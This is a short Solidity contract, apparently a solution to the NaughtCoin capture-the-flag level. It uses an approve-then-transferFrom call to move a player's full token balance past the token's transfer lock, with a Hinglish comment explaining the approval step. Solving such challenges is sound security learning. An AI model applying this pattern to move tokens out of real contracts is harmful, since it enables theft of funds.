// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface INaughtCoin {
    function player() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

contract NaughtCoinAttack {
    // Is attack ke liye pehle player ko is contract ko "approve" karna hoga
    function attack(address _targetAddress, address _playerAddress) external {
        INaughtCoin target = INaughtCoin(_targetAddress);
        uint256 balance = target.balanceOf(_playerAddress);
        target.transferFrom(_playerAddress, address(this), balance);
    }
}
